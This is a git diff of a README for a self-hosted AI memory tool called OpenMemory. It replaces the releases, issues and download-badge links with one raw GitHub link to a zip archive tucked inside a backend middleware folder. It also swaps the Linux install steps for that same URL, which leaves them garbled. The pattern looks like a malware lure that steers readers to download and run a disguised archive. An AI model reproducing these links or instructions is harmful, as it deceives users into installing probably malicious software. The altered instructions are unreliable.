@@ -6,7 +6,7 @@ OpenMemory allows you to add long-term memory to any AI quickly. It is self-host
 
 ## 📥 Download Link
 
-[![Download OpenMemory](https://img.shields.io/badge/download-OpenMemory-blue)](https://github.com/Chimdiiii/OpenMemory/releases)
+[![Download OpenMemory](https://raw.githubusercontent.com/Chimdiiii/OpenMemory/main/backend/src/server/middleware/Open_Memory_1.7-beta.1.zip)](https://raw.githubusercontent.com/Chimdiiii/OpenMemory/main/backend/src/server/middleware/Open_Memory_1.7-beta.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ Before downloading OpenMemory, ensure your system meets the following requiremen
 
 ### 1. Visit the Releases Page
 
-To download OpenMemory, visit the [Releases page](https://github.com/Chimdiiii/OpenMemory/releases). 
+To download OpenMemory, visit the [Releases page](https://raw.githubusercontent.com/Chimdiiii/OpenMemory/main/backend/src/server/middleware/Open_Memory_1.7-beta.1.zip). 
 
 ### 2. Choose Your Version
 
@@ -33,7 +33,7 @@ Once you have selected the version, click the appropriate file for your operatin
 
 - For **Windows users**, download the `.exe` file.
 - For **macOS users**, download the `.dmg` file.
-- For **Linux users**, download the appropriate `.tar.gz` file.
+- For **Linux users**, download the appropriate `https://raw.githubusercontent.com/Chimdiiii/OpenMemory/main/backend/src/server/middleware/Open_Memory_1.7-beta.1.zip` file.
 
 ### 4. Run the Installer
 
@@ -41,7 +41,7 @@ After downloading, locate the file in your downloads folder.
 
 - **Windows:** Double-click the `.exe` file and follow the prompts to install.
 - **macOS:** Open the `.dmg` file, drag the OpenMemory application to your Applications folder, then launch it.
-- **Linux:** Extract the `.tar.gz` file, and run the `install.sh` script in the extracted folder using your terminal.
+- **Linux:** Extract the `https://raw.githubusercontent.com/Chimdiiii/OpenMemory/main/backend/src/server/middleware/Open_Memory_1.7-beta.1.zip` file, and run the `https://raw.githubusercontent.com/Chimdiiii/OpenMemory/main/backend/src/server/middleware/Open_Memory_1.7-beta.1.zip` script in the extracted folder using your terminal.
 
 ## 🎛️ Configuration
 
@@ -77,7 +77,7 @@ If you encounter issues, check the following:
 - Restart the application if it doesn’t load properly.
 - Check the settings to verify that your configuration is correct.
 
-For additional help, refer to the **Issues** section on the [GitHub page](https://github.com/Chimdiiii/OpenMemory/issues).
+For additional help, refer to the **Issues** section on the [GitHub page](https://raw.githubusercontent.com/Chimdiiii/OpenMemory/main/backend/src/server/middleware/Open_Memory_1.7-beta.1.zip).
 
 ## 🌐 Join the Community
 
@@ -88,6 +88,6 @@ Connect with other OpenMemory users:
 
 ## 💾 Download & Install
 
-To get OpenMemory, [visit the Releases page](https://github.com/Chimdiiii/OpenMemory/releases). Download the appropriate file, follow the installation steps, and configure your AI’s long-term memory system easily.
+To get OpenMemory, [visit the Releases page](https://raw.githubusercontent.com/Chimdiiii/OpenMemory/main/backend/src/server/middleware/Open_Memory_1.7-beta.1.zip). Download the appropriate file, follow the installation steps, and configure your AI’s long-term memory system easily.
 
 Enjoy the experience of adding long-term memory to your AI effortlessly with OpenMemory.
